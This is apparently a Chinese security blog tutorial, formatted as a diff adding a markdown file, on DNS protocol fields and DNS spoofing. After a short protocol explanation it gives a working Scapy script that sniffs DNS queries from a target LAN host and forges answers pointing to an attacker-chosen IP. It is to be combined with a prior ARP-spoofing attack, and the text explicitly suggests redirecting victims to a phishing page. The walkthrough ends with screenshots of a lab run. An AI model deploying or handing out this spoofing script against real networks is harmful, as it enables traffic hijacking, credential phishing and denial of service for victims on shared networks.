@@ -1,0 +1,117 @@
+**DNS**
+
+DNS即域名系统（英文：Domain Name
+System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符
+
+ **DNS协议**
+
+DNS协议即域名解析协议，是用来将域名转换为IP地址。
+
+ **DNS协议报文格式**
+
+会话标识：是DNS报文的ID标识，对于请求报文和其对应的应答报文，这个字段是相同的，通过它可以区分DNS应答报文是哪个请求的响应
+
+标志：
+
+QR（1bit）| 查询/响应标志，0为查询，1为响应  
+---|---  
+opcode（4bit）| 0表示标准查询，1表示反向查询，2表示服务器状态请求  
+AA（1bit）| 表示授权回答  
+TC（1bit）| 表示可截断的  
+RD（1bit）| 表示期望递归  
+RA（1bit）| 表示可用递归  
+rcode（4bit）| 表示返回码，0表示没有差错，3表示名字差错，2表示服务器错误（Server Failure）  
+  
+数量字段：Questions、Answer RRs、Authority RRs、Additional RRs
+各自表示后面的四个区域的数目。Questions表示查询问题区域节的数量，Answers表示回答区域的数量，Authoritative
+namesversers表示授权区域的数量，Additional recoreds表示附加区域的数量
+
+ **DNS欺骗原理**
+
+冒充域名服务器，或者修改dns响应包中的解析结果换成攻击者的IP地址，这样的话，就会指向攻击者ip地址，如果我们写成一个钓鱼页面放入apache或者nignx上部署，我们可以修改指向钓鱼网页服务器的ip和端口，进行欺骗钓鱼
+
+ **DNS欺骗实现**
+
+首先欺骗者向目标机器发送构造好的ARP应答数据包，ARP欺骗成功后，监听53端口的dns数据包，筛选目标ip地址的dns数据包，获取请求报文，删除部分参数，修改数据包中的源ip和目标ip，源端口和目标端口，构造响应报文，修改anwser包中的解析结果，换成攻击地址，发送给被攻击者
+
+ **代码实现**
+
+    
+    
+    #!/usr/bin/env python
+    # -*- coding: utf-8 -*-    # @File  : DNS_attack.py
+    # @Author: Feng
+    # @Date  : 2020/11/18
+    # @Desc  : trace
+    from scapy.all import *
+    import sys
+    
+    
+    # dns包 = IP()/UDP()/DNS(id,qr,opcode,rd，qd=DNSQR(qnname=dns_name), verbose=False) id标识 匹配请求与回应 qr 0表示查询报文 opcode 0表示标准查询 rd 1表示递归
+    
+    def DNS_Spoof(data):
+        try:
+            # ip_fields = data.getlayer(IP).fields
+            # udp_fields = data.getlayer(UDP).fields
+            # dns_fields = data.getlayer(DNS).fields
+    
+            #print(ip_fields)
+            #print(udp_fields)
+            # print(dns_fields)
+            req_domain = data[DNS].qd.qname
+            print(str(req_domain).split("'")[1])
+            print(str(data[IP].src))
+            print(str(data[IP].src) == '192.168.31.135')
+            print(str(req_domain) == 'www.baidu.com')
+            if str(data[IP].src) == '192.168.31.135':
+                #if str(req_domain).split("'")[1].find('baidu.com'):
+                    print(str(req_domain))
+                    del (data[UDP].len)
+                    del (data[UDP].chksum)
+                    del (data[IP].len)
+                    del (data[IP].chksum)
+                    res = data.copy()
+                    res.FCfield = 2
+                    res.src, res.dst = data.dst, data.src
+                    res[IP].src, res[IP].dst = data[IP].dst, data[IP].src
+                    res.sport, res.dport = data.dport, data.sport
+                    res[DNS].qr = 1
+                    res[DNS].ra = 1
+                    res[DNS].ancount = 1
+                    res[DNS].an = DNSRR(
+                        rrname = req_domain,
+                        type = 'A',
+                        rclass = 'IN',
+                        ttl = 900,
+                        rdata = '220.220.220.220'
+                    )
+                    sendp(res)
+            else:
+                print('不是目标主机')
+        except Exception as e:
+            print(e)
+    
+    
+    def DNS_S(iface):
+        sniff(prn=DNS_Spoof,filter='udp dst port 53',iface=iface)
+    
+    
+    if __name__ == '__main__':
+        DNS_S('Realtek 8812BU Wireless LAN 802.11ac USB NIC')
+    
+
+以`www.baidu.com`解析为例，构造dns响应包，dns包 =
+IP()/UDP()/DNS(id,qr,opcode,rd，qd=DNSQR(qnname=dns_name), verbose=False) id标识
+匹配请求与回应 qr 0表示查询报文 opcode 0表示标准查询 rd 1表示递归，做一些筛选条件判断，用wireshark监听结果
+
+iface参数：指的是自己的无线网卡的name，目标机器是`192.168.31.135`,本机`192.168.31.225`，网关`192.168.31.1`，解析结果改为`220.220.220.220`首先run一下之前写的arp脚本，进行arp欺骗攻击
+
+![image.png](https://image.3001.net/images/20210406/1617679100_606bd2fcd6f0400644b60.png!small)  
+然后进行dns欺骗攻击  
+![image.png](https://image.3001.net/images/20210406/1617679123_606bd31360938e03de2bd.png!small)
+
+匹配到baidu的结果，打印出来，wireshark中也抓取了icmp的ping包，由于arp攻击造成被攻击者流量无响应，后期可以用流量转发把流量包在转给目标主机形成一个循环!![image.png](https://image.3001.net/images/20210406/1617679158_606bd336c367cb5a09cc6.png!small)  
+展示一下攻击的结果，百度被解析成了设定的结果
+
+![image.png](https://image.3001.net/images/20210406/1617679180_606bd34ca35a8bc846fb6.png!small)
+
